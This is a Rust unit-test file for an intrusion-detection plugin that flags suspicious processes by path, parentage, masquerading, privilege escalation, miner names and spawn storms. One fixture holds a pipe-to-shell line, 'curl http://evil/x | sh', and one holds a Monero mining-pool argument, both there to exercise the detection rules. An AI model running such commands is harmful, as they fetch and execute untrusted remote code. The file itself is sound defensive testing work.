//! Unit tests for the Samurai plugin rule engine and action dispatch.
//!
//! All snapshots are synthetic and built with the real `xtop-plugin-api`
//! model structs; only the fields a rule reads are populated. Tests are
//! deterministic: no sleeps, no timing assumptions (the spawn-storm window
//! is exercised through `rule_spawn_storm` with an injected clock).

use std::path::PathBuf;

use xtop_plugin_api::model::{
    LoadAvg, MemoryInfo, ProcessInfo, SwapInfo, SystemInfo, SystemSnapshot,
};
use xtop_plugin_api::{
    AlertThresholds, HostState, Plugin, PluginCapability, PluginContext, PluginError, RuntimeConfig,
};

use super::alert::{SamuraiAlert, Severity};
use super::{actions, SamuraiPlugin};

// ---------------------------------------------------------------------------
// Test doubles
// ---------------------------------------------------------------------------

/// Minimal `ProcessInfo` with sane defaults; tests override the fields a
/// rule reads.
fn proc(pid: u32, name: &str) -> ProcessInfo {
    ProcessInfo {
        pid,
        name: name.to_string(),
        cpu_usage: 0.0,
        memory: 0,
        user_id: Some("1000".to_string()),
        state: "Sleeping".to_string(),
        cmd: String::new(),
        exe_path: None,
        parent_pid: None,
        cmd_full: vec![],
        start_time: 0,
        run_time: 0,
        effective_user_id: None,
        group_id: None,
        cwd: None,
        thread_count: 0,
        open_files: 0,
        open_files_limit: 0,
        disk_total_read_bytes: 0,
        disk_total_write_bytes: 0,
        environ: vec![],
        session_id: None,
    }
}

fn snapshot(processes: Vec<ProcessInfo>) -> SystemSnapshot {
    SystemSnapshot {
        cpus: vec![],
        memory: MemoryInfo {
            total: 0,
            used: 0,
            available: 0,
            free: 0,
            percent: 0.0,
        },
        swap: SwapInfo {
            total: 0,
            used: 0,
            free: 0,
            percent: 0.0,
        },
        disks: vec![],
        networks: vec![],
        processes,
        load_avg: LoadAvg {
            one: 0.0,
            five: 0.0,
            fifteen: 0.0,
        },
        uptime: 0,
        cpu_temp: 0.0,
        disk_io: vec![],
        batteries: vec![],
        gpus: vec![],
        sys_info: SystemInfo::default(),
    }
}

/// Host double implementing the full `HostState` contract over a snapshot.
struct FakeHost {
    snap: SystemSnapshot,
    theme_ok: bool,
    layout_ok: bool,
    kill_ok: bool,
    interval_ms: u64,
}

impl FakeHost {
    fn new(processes: Vec<ProcessInfo>) -> Self {
        Self {
            snap: snapshot(processes),
            theme_ok: true,
            layout_ok: true,
            kill_ok: true,
            interval_ms: 0,
        }
    }
}

impl HostState for FakeHost {
    fn snapshot(&self) -> SystemSnapshot {
        self.snap.clone()
    }

    fn system_info(&self) -> SystemInfo {
        self.snap.sys_info.clone()
    }

    fn kill_process(&mut self, _pid: u32) -> bool {
        self.kill_ok
    }

    fn set_alert_thresholds(&mut self, _cpu: f64, _mem: f64, _disk: f64) {}

    fn alerts(&self) -> AlertThresholds {
        AlertThresholds {
            cpu_high: 80.0,
            mem_high: 80.0,
            disk_high: 80.0,
        }
    }

    fn config(&self) -> RuntimeConfig {
        RuntimeConfig {
            theme: "miami".to_string(),
            layout: "Dashboard".to_string(),
            interval_ms: self.interval_ms,
            hostname: "testhost".to_string(),
        }
    }

    fn set_theme_by_name(&mut self, _name: &str) -> bool {
        self.theme_ok
    }

    fn set_layout_by_name(&mut self, _name: &str) -> bool {
        self.layout_ok
    }

    fn set_update_interval_ms(&mut self, ms: u64) {
        self.interval_ms = ms;
    }
}

fn ctx(host: &mut dyn HostState) -> PluginContext<'_> {
    PluginContext::new(
        host,
        PathBuf::from("/tmp/xtop-plugin-test"),
        vec![
            PluginCapability::ReadSystemInfo,
            PluginCapability::KillProcesses,
            PluginCapability::ModifyConfig,
            PluginCapability::RenderWidgets,
        ],
    )
}

fn plugin() -> SamuraiPlugin {
    SamuraiPlugin::new()
}

fn rules_fire(processes: Vec<ProcessInfo>) -> Vec<SamuraiAlert> {
    let mut host = FakeHost::new(processes);
    let mut p = plugin();
    let mut context = ctx(&mut host);
    // The first analysis runs on the 5th tick; five ticks keep it simple.
    for _ in 0..5 {
        p.on_tick(&mut context).unwrap();
    }
    p.alerts.clone()
}

// ---------------------------------------------------------------------------
// Rule 1: suspicious executable path
// ---------------------------------------------------------------------------

#[test]
fn suspicious_exe_path_fires_for_tmp_binaries() {
    let mut p = proc(42, "sneaky");
    p.exe_path = Some("/tmp/sneaky".to_string());
    let alert = plugin().rule_suspicious_exe_path(&p);
    let alert = alert.expect("rule should fire");
    assert_eq!(alert.rule, "suspicious_exe_path");
    assert_eq!(alert.severity, Severity::Critical);
    assert_eq!(alert.pid, 42);
}

#[test]
fn suspicious_exe_path_ignores_canonical_paths() {
    let mut p = proc(7, "bash");
    p.exe_path = Some("/usr/bin/bash".to_string());
    assert!(plugin().rule_suspicious_exe_path(&p).is_none());
}

// ---------------------------------------------------------------------------
// Rule 2: orphan process (PPID = 1)
// ---------------------------------------------------------------------------

#[test]
fn orphan_rule_fires_for_unknown_ppid1_child() {
    let mut p = proc(99, "mysteryd");
    p.parent_pid = Some(1);
    p.run_time = 10;
    let alert = plugin().rule_orphan_process(&p).expect("rule should fire");
    assert_eq!(alert.rule, "orphan_process");
    assert_eq!(alert.severity, Severity::Critical);
}

#[test]
fn orphan_rule_skips_allowed_daemons() {
    let mut p = proc(1, "systemd");
    p.parent_pid = Some(1);
    p.run_time = 5;
    assert!(plugin().rule_orphan_process(&p).is_none());
}

#[test]
fn orphan_rule_downgrades_long_running_to_warning() {
    let mut p = proc(99, "mysteryd");
    p.parent_pid = Some(1);
    p.run_time = 500;
    let alert = plugin().rule_orphan_process(&p).expect("rule should fire");
    assert_eq!(alert.severity, Severity::Warning);
}

#[test]
fn orphan_rule_ignores_non_init_children() {
    let mut p = proc(99, "worker");
    p.parent_pid = Some(88);
    assert!(plugin().rule_orphan_process(&p).is_none());
}

// ---------------------------------------------------------------------------
// Rule 3: masquerading
// ---------------------------------------------------------------------------

#[test]
fn masquerading_fires_critical_for_system_name_off_canonical_path() {
    let mut p = proc(5, "svchost");
    p.exe_path = Some("/tmp/evil".to_string());
    let alert = plugin().rule_masquerading(&p).expect("rule should fire");
    assert_eq!(alert.rule, "process_masquerading");
    assert_eq!(alert.severity, Severity::Critical);
}

#[test]
fn masquerading_fires_warning_for_name_stem_mismatch() {
    let mut p = proc(6, "kitt");
    p.exe_path = Some("/opt/vendor/pwn".to_string());
    let alert = plugin().rule_masquerading(&p).expect("rule should fire");
    assert_eq!(alert.severity, Severity::Warning);
}

#[test]
fn masquerading_allows_common_aliases_and_matches() {
    let mut python = proc(6, "python3");
    python.exe_path = Some("/usr/bin/python3.11".to_string());
    assert!(plugin().rule_masquerading(&python).is_none());

    let mut fine = proc(6, "bash");
    fine.exe_path = Some("/usr/bin/bash".to_string());
    assert!(plugin().rule_masquerading(&fine).is_none());
}

// ---------------------------------------------------------------------------
// Rule 4: privilege escalation (EUID != UID)
// ---------------------------------------------------------------------------

#[test]
fn escalation_fires_critical_when_euid_root_differs() {
    let mut p = proc(9, "helper");
    p.user_id = Some("1000".to_string());
    p.effective_user_id = Some("0".to_string());
    p.exe_path = Some("/tmp/helper".to_string());
    let alert = plugin()
        .rule_privilege_escalation(&p)
        .expect("rule should fire");
    assert_eq!(alert.rule, "privilege_escalation");
    assert_eq!(alert.severity, Severity::Critical);
}

#[test]
fn escalation_skips_equal_ids_and_known_suid() {
    let mut same = proc(9, "helper");
    same.user_id = Some("1000".to_string());
    same.effective_user_id = Some("1000".to_string());
    assert!(plugin().rule_privilege_escalation(&same).is_none());

    let mut suid = proc(9, "sudo");
    suid.user_id = Some("1000".to_string());
    suid.effective_user_id = Some("0".to_string());
    suid.exe_path = Some("/usr/bin/sudo".to_string());
    assert!(plugin().rule_privilege_escalation(&suid).is_none());
}

// ---------------------------------------------------------------------------
// Rule 5: suspicious browser child
// ---------------------------------------------------------------------------

#[test]
fn browser_child_fires_for_unknown_children() {
    let parent = proc(11, "chrome");
    let mut child = proc(12, "xterm");
    child.parent_pid = Some(11);
    let snap = snapshot(vec![parent, child.clone()]);
    let map: std::collections::HashMap<u32, &ProcessInfo> =
        snap.processes.iter().map(|p| (p.pid, p)).collect();
    let alert = plugin()
        .rule_suspicious_child_of_browser(&child, &map)
        .expect("rule should fire");
    assert_eq!(alert.rule, "suspicious_child_of_browser");
    assert_eq!(alert.severity, Severity::Warning);
}

#[test]
fn browser_child_skips_helpers_and_non_browser_parents() {
    let parent = proc(11, "chrome");
    let mut helper = proc(13, "chrome_renderer");
    helper.parent_pid = Some(11);
    let plain = proc(20, "bash");
    let mut child = proc(21, "xterm");
    child.parent_pid = Some(20);
    let snap = snapshot(vec![parent, helper.clone(), plain, child.clone()]);
    let map: std::collections::HashMap<u32, &ProcessInfo> =
        snap.processes.iter().map(|p| (p.pid, p)).collect();
    let p = plugin();
    assert!(p.rule_suspicious_child_of_browser(&helper, &map).is_none());
    assert!(p.rule_suspicious_child_of_browser(&child, &map).is_none());
}

// ---------------------------------------------------------------------------
// Rule 6: known threat names / command patterns
// ---------------------------------------------------------------------------

fn compile_threat_cmds() -> Vec<regex::Regex> {
    super::KNOWN_THREAT_CMDS
        .iter()
        .filter_map(|p| regex::Regex::new(p).ok())
        .collect()
}

#[test]
fn known_threat_fires_for_miner_name() {
    let p = proc(30, "xmrig");
    let alert = plugin()
        .rule_known_threat_pattern(&p, &compile_threat_cmds())
        .expect("rule should fire");
    assert_eq!(alert.rule, "known_threat_pattern");
    assert_eq!(alert.severity, Severity::Critical);
}

#[test]
fn known_threat_fires_for_pool_command_line() {
    let mut p = proc(31, "miner");
    p.cmd_full = vec![
        "/usr/bin/miner".to_string(),
        "--donate-level=1".to_string(),
        "pool.monero.example:3333".to_string(),
    ];
    let alert = plugin()
        .rule_known_threat_pattern(&p, &compile_threat_cmds())
        .expect("rule should fire");
    assert_eq!(alert.severity, Severity::Critical);
}

// ---------------------------------------------------------------------------
// Rule 7: pipe / download command lines
// ---------------------------------------------------------------------------

fn compile_pipe_re() -> Vec<regex::Regex> {
    super::PIPE_PATTERNS
        .iter()
        .filter_map(|p| regex::Regex::new(p).ok())
        .collect()
}

#[test]
fn pipe_rule_fires_for_curl_pipe_sh() {
    let mut p = proc(40, "bash");
    p.cmd_full = vec![
        "bash".to_string(),
        "-c".to_string(),
        "curl http://evil/x | sh".to_string(),
    ];
    let alert = plugin()
        .rule_suspicious_pipe_or_download(&p, &compile_pipe_re())
        .expect("rule should fire");
    assert_eq!(alert.rule, "suspicious_pipe_or_download");
    assert_eq!(alert.severity, Severity::Critical);
}

#[test]
fn pipe_rule_ignores_plain_commands() {
    let mut p = proc(41, "curl");
    p.cmd_full = vec![
        "curl".to_string(),
        "https://example.com/file.tar.gz".to_string(),
    ];
    assert!(plugin()
        .rule_suspicious_pipe_or_download(&p, &compile_pipe_re())
        .is_none());
}

// ---------------------------------------------------------------------------
// Rules 8 & 9: high thread count / high fd count
// ---------------------------------------------------------------------------

#[test]
fn high_thread_fires_warning_at_threshold_and_critical_above_1000() {
    let mut warn = proc(50, "oddproc");
    warn.thread_count = 500;
    let alert = plugin()
        .rule_high_thread_anomaly(&warn)
        .expect("rule should fire");
    assert_eq!(alert.severity, Severity::Warning);

    let mut crit = proc(51, "oddproc");
    crit.thread_count = 1500;
    let alert = plugin()
        .rule_high_thread_anomaly(&crit)
        .expect("rule should fire");
    assert_eq!(alert.severity, Severity::Critical);
}

#[test]
fn high_thread_skips_below_threshold_and_allowlisted_names() {
    let mut below = proc(50, "oddproc");
    below.thread_count = 499;
    assert!(plugin().rule_high_thread_anomaly(&below).is_none());

    let mut allowed = proc(52, "chrome");
    allowed.thread_count = 600;
    assert!(plugin().rule_high_thread_anomaly(&allowed).is_none());
}

#[test]
fn high_fd_fires_at_threshold_and_skips_allowlisted() {
    let mut p = proc(60, "oddproc");
    p.open_files = 1000;
    let alert = plugin()
        .rule_suspicious_fd_anomaly(&p)
        .expect("rule should fire");
    assert_eq!(alert.rule, "suspicious_fd_anomaly");
    assert_eq!(alert.severity, Severity::Info);

    let mut below = proc(61, "oddproc");
    below.open_files = 999;
    assert!(plugin().rule_suspicious_fd_anomaly(&below).is_none());

    let mut allowed = proc(62, "nginx");
    allowed.open_files = 5000;
    assert!(plugin().rule_suspicious_fd_anomaly(&allowed).is_none());
}

// ---------------------------------------------------------------------------
// Rule 10: spawn storm (deterministic: injected clock)
// ---------------------------------------------------------------------------

#[test]
fn spawn_storm_fires_after_six_fresh_instances_within_window() {
    let mut p = plugin();
    // now = 1000; each process starts at 1000 and has run_time 0.
    let mut alert = None;
    for pid in 1..=6 {
        let mut process = proc(pid, "stormy");
        process.start_time = 1000;
        process.run_time = 0;
        alert = p.rule_spawn_storm(&process, 1000);
    }
    let alert = alert.expect("6th fresh instance should trigger");
    assert_eq!(alert.rule, "recent_spawn_storm");
    assert_eq!(alert.severity, Severity::Warning);
    assert!(alert.message.contains("6 new instances"));
}

#[test]
fn spawn_storm_dedupes_pids_and_purges_old_entries() {
    let mut p = plugin();
    // Five fresh instances: under the threshold.
    for pid in 1..=5 {
        let mut process = proc(pid, "stormy");
        process.start_time = 1000;
        process.run_time = 0;
        assert!(p.rule_spawn_storm(&process, 1000).is_none());
    }
    // Re-seeing the same pid must not count again.
    let mut dup = proc(3, "stormy");
    dup.start_time = 1000;
    dup.run_time = 0;
    assert!(p.rule_spawn_storm(&dup, 1000).is_none());
    // A sixth pid that started outside the 120 s window is purged.
    let mut old = proc(6, "stormy");
    old.start_time = 800; // now=1000 -> 200 s old
    old.run_time = 0;
    assert!(p.rule_spawn_storm(&old, 1000).is_none());
    // And a process that has been running for > 120 s is never recorded.
    let mut long_running = proc(7, "stormy");
    long_running.start_time = 100;
    long_running.run_time = 500;
    assert!(p.rule_spawn_storm(&long_running, 1000).is_none());
    assert_eq!(p.spawn_history.get("stormy").map(Vec::len), Some(5));
}

#[test]
fn spawn_storm_ignores_long_running_processes() {
    let mut p = plugin();
    for pid in 1..=6 {
        let mut process = proc(pid, "steady");
        process.start_time = 100;
        process.run_time = 900;
        assert!(p.rule_spawn_storm(&process, 1000).is_none());
    }
}

// ---------------------------------------------------------------------------
// Integrated analysis: negative case, cap, cadence
// ---------------------------------------------------------------------------

#[test]
fn benign_snapshot_produces_no_alerts() {
    let mut sshd = proc(1, "sshd");
    sshd.exe_path = Some("/usr/sbin/sshd".to_string());
    sshd.parent_pid = Some(1); // allowed orphan
    sshd.user_id = Some("0".to_string());
    sshd.effective_user_id = Some("0".to_string());

    let mut python = proc(2, "python3");
    python.exe_path = Some("/usr/bin/python3.11".to_string());
    python.thread_count = 20;
    python.open_files = 30;
    python.cmd_full = vec!["python3".to_string(), "server.py".to_string()];

    let mut chrome = proc(3, "chrome");
    chrome.thread_count = 800; // allowlisted
    chrome.open_files = 2000; // allowlisted

    assert!(rules_fire(vec![sshd, python, chrome]).is_empty());
}

#[test]
fn analysis_truncates_alerts_to_max_alerts() {
    let mut processes = Vec::new();
    for pid in 1..=60 {
        let mut p = proc(pid, &format!("p{pid:02}"));
        p.exe_path = Some(format!("/tmp/p{pid:02}"));
        processes.push(p);
    }
    let alerts = rules_fire(processes);
    assert_eq!(alerts.len(), 50);
    assert!(alerts.iter().all(|a| a.rule == "suspicious_exe_path"));
}

#[test]
fn full_analysis_picks_up_storm_from_synthetic_snapshot() {
    let now = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs();
    let mut processes = Vec::new();
    for pid in 1..=6 {
        let mut p = proc(pid, "stormy");
        p.start_time = now;
        p.run_time = 1;
        p.exe_path = Some("/usr/bin/stormy".to_string());
        processes.push(p);
    }
    let alerts = rules_fire(processes);
    assert!(
        alerts.iter().any(|a| a.rule == "recent_spawn_storm"),
        "expected a spawn storm alert, got: {alerts:?}"
    );
}

#[test]
fn on_tick_runs_analysis_every_fifth_tick_only() {
    let mut bad = proc(70, "sneaky");
    bad.exe_path = Some("/dev/shm/sneaky".to_string());

    let mut host = FakeHost::new(vec![]);
    let mut p = plugin();

    // Ticks 1..4 with a benign snapshot: no alerts computed yet.
    for _ in 0..4 {
        let mut context = ctx(&mut host);
        p.on_tick(&mut context).unwrap();
        assert!(p.alerts.is_empty());
    }
    // Tick 5 with a triggering process: analysis runs.
    host.snap = snapshot(vec![bad]);
    {
        let mut context = ctx(&mut host);
        p.on_tick(&mut context).unwrap();
    }
    assert_eq!(p.alerts.len(), 1);
    assert_eq!(p.alerts[0].rule, "suspicious_exe_path");
}

#[test]
fn on_tick_propagates_snapshot_denial() {
    // Context without ReadSystemInfo: the analysis tick must surface the
    // capability error instead of silently hiding it.
    let mut host = FakeHost::new(vec![]);
    let mut p = plugin();
    for _ in 0..4 {
        let mut context = ctx(&mut host);
        p.on_tick(&mut context).unwrap();
    }
    let mut restricted = PluginContext::new(
        &mut host,
        PathBuf::from("/tmp/xtop-plugin-test"),
        vec![PluginCapability::RenderWidgets],
    );
    let err = p.on_tick(&mut restricted).unwrap_err();
    assert!(err.to_string().contains("ReadSystemInfo"));
}

// ---------------------------------------------------------------------------
// Action dispatch
// ---------------------------------------------------------------------------

#[test]
fn dispatch_returns_json_for_processes_search() {
    let mut sshd = proc(1, "sshd");
    sshd.cpu_usage = 3.5;
    let mut bash = proc(2, "bash");
    bash.cpu_usage = 0.5;
    let mut host = FakeHost::new(vec![sshd, bash]);
    let mut p = plugin();
    let mut context = ctx(&mut host);

    let out = p
        .execute(&mut context, actions::PROCESSES_SEARCH, "sshd")
        .expect("search should succeed");
    let parsed: serde_json::Value = serde_json::from_str(&out).unwrap();
    let arr = parsed.as_array().expect("response should be a JSON array");
    assert_eq!(arr.len(), 1);
    assert_eq!(arr[0]["name"], "sshd");
    assert_eq!(arr[0]["pid"], 1);
    // Fields beyond name can be selected.
    let multi = p
        .execute(
            &mut context,
            actions::PROCESSES_SEARCH,
            "ba|sh,fields=name,cmd",
        )
        .unwrap();
    assert_eq!(
        serde_json::from_str::<serde_json::Value>(&multi)
            .unwrap()
            .as_array()
            .unwrap()
            .len(),
        2
    );
}

#[test]
fn dispatch_rejects_bad_regex_and_unknown_actions() {
    let mut host = FakeHost::new(vec![]);
    let mut p = plugin();
    let mut context = ctx(&mut host);

    let err = p
        .execute(&mut context, actions::PROCESSES_SEARCH, "([unclosed")
        .unwrap_err();
    assert!(matches!(err, PluginError::Recoverable(_)));
    assert!(err.to_string().contains("invalid regex"));

    let unknown = p.execute(&mut context, "system.magic", "").unwrap_err();
    assert!(matches!(unknown, PluginError::UnknownAction(a) if a == "system.magic"));
}

#[test]
fn dispatch_config_set_parse_paths() {
    let mut host = FakeHost::new(vec![]);
    let mut p = plugin();

    // interval_ms=2000 mutates the host.
    let out = {
        let mut context = ctx(&mut host);
        p.execute(&mut context, actions::CONFIG_SET, "interval_ms=2000")
            .unwrap()
    };
    let parsed: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(parsed["interval_ms"], 2000);
    assert_eq!(host.interval_ms, 2000);

    // Unknown key: recoverable parse error, host untouched.
    let err = {
        let mut context = ctx(&mut host);
        p.execute(&mut context, actions::CONFIG_SET, "bogus=1")
            .unwrap_err()
    };
    assert!(err.to_string().contains("expected interval_ms"));

    // Non-numeric interval is an error, not a silent default.
    let err = {
        let mut context = ctx(&mut host);
        p.execute(&mut context, actions::CONFIG_SET, "interval_ms=soon")
            .unwrap_err()
    };
    assert!(err.to_string().contains("invalid interval_ms"));
}

#[test]
fn dispatch_process_info_missing_pid_is_an_error() {
    let mut host = FakeHost::new(vec![proc(1, "sshd")]);
    let mut p = plugin();
    let mut context = ctx(&mut host);

    let err = p
        .execute(&mut context, actions::PROCESS_INFO, "9999")
        .unwrap_err();
    assert!(err.to_string().contains("not found"));
}

#[test]
fn dispatch_processes_top_count_and_filter() {
    let mut a = proc(1, "nginx");
    a.cpu_usage = 9.0;
    let mut b = proc(2, "bash");
    b.cpu_usage = 2.0;
    let mut host = FakeHost::new(vec![a, b]);
    let mut p = plugin();
    let mut context = ctx(&mut host);

    let out = p
        .execute(&mut context, actions::PROCESSES_TOP, "1,filter=nginx")
        .unwrap();
    let arr = serde_json::from_str::<serde_json::Value>(&out).unwrap();
    let arr = arr.as_array().unwrap();
    assert_eq!(arr.len(), 1);
    assert_eq!(arr[0]["name"], "nginx");

    let zero = p
        .execute(&mut context, actions::PROCESSES_TOP, "0")
        .unwrap_err();
    assert!(zero.to_string().contains("count must be > 0"));
}

#[test]
fn dispatch_plugin_status_reports_state() {
    let mut host = FakeHost::new(vec![]);
    let mut p = plugin();
    let mut context = ctx(&mut host);
    let out = p.execute(&mut context, actions::PLUGIN_STATUS, "").unwrap();
    let parsed: serde_json::Value = serde_json::from_str(&out).unwrap();
    assert_eq!(parsed["enabled"], true);
    assert!(parsed["last_action"]
        .as_str()
        .unwrap()
        .contains("plugin.status"));
}

#[test]
fn manifest_and_widget_use_the_plugin_id_constant() {
    let m = plugin().manifest();
    assert_eq!(m.id, super::PLUGIN_ID);
    assert_eq!(m.version, env!("CARGO_PKG_VERSION"));
    let w = plugin().widget().expect("samurai registers a widget");
    assert_eq!(w.name, super::PLUGIN_ID);
    assert!(m.capabilities.contains(&PluginCapability::ReadSystemInfo));
}
